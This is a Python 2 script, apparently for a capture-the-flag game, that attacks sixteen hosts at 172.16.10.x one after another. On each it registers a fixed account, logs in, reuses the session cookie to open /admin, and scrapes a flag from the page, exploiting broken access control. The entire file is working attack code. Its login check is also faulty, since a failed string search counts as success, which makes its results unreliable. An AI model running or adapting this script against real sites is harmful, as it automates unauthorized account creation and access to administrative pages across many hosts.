#coding:utf-8
import urllib
import urllib2

'''
网页POST提交数据
'''



def register():
    urlst = "http://172.16.10."
    intst = 1
    enst = 17
    for i in range(intst,enst):
        url = urlst+str(i)+'/index/register/register.html'
        print url
        #POST数据，如果是GET，直接放在url后面即可，不需要使用data传参
        values = {
            'username':'yao_6',
            'password':'yaoyao',
            'repassword':'yaoyao',
            'reset_question':'1',
            'reset_answer':'1',
        }
        #print "------------------POST信息--------------------"
        data = urllib.urlencode(values)
        #这个输出，就是把内容用&与_连接起来
        print data
        print "------------------POST信息--------------------"
        #print "-------------------头信息---------------------"
        req = urllib2.Request(url, data)
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        response = urllib2.urlopen(req)
        the_page = response.read()
        #print response.headers
        #print "-------------------头信息---------------------"
        #print "-------------------返回网页-------------------"
        if the_page.find("Reg success") >=0:
            print "Success：",url
        elif the_page.find("Already exist") >=0 :
            print "Already：",url
        else:
            print "Failed：",url
            #print the_page
        #print "-------------------返回网页-------------------"


def login():
    urlst = "http://172.16.10."
    intst = 1
    enst = 17
    for i in range(intst,enst):
        url = urlst+str(i)+'/index/login/login.html'
        print url
        #POST数据，如果是GET，直接放在url后面即可，不需要使用data传参
        values = {
            'username':'yao_6',
            'password':'yaoyao',
        }
        #print "------------------POST信息--------------------"
        data = urllib.urlencode(values)
        #这个输出，就是把内容用&与_连接起来
        print data
        #print "------------------POST信息--------------------"
        #print "-------------------头信息---------------------"
        req = urllib2.Request(url, data)
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        response = urllib2.urlopen(req)
        the_page = response.read()
        #print response.headers
        #print "-------------------头信息---------------------"
        #print "-------------------返回网页-------------------"
        if the_page.find("Success"):
            ll = response.headers['Set-Cookie']
            print url, response.headers['Set-Cookie']
            getflag(i,ll[10:])
        else:
            print "Fail:",url
        #print "-------------------返回网页-------------------"



def getflag(id, phpsess):
    url = "http://172.16.10."+str(id)+'/admin'
    print url
    req = urllib2.Request(url)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req.add_header('Cookie',"PHPSESSID="+phpsess)
    req.add_header('Upgrade-Insecure-Requests',1)
    response = urllib2.urlopen(req)
    the_page = response.read()
    if the_page.find('FLAG') >=0:
        l = the_page.find('<h1 style="margin-top:40px;color:white" class="templatemo-header">')
        print the_page[l+66:l+66+32]
    print response.headers
register()
#login()


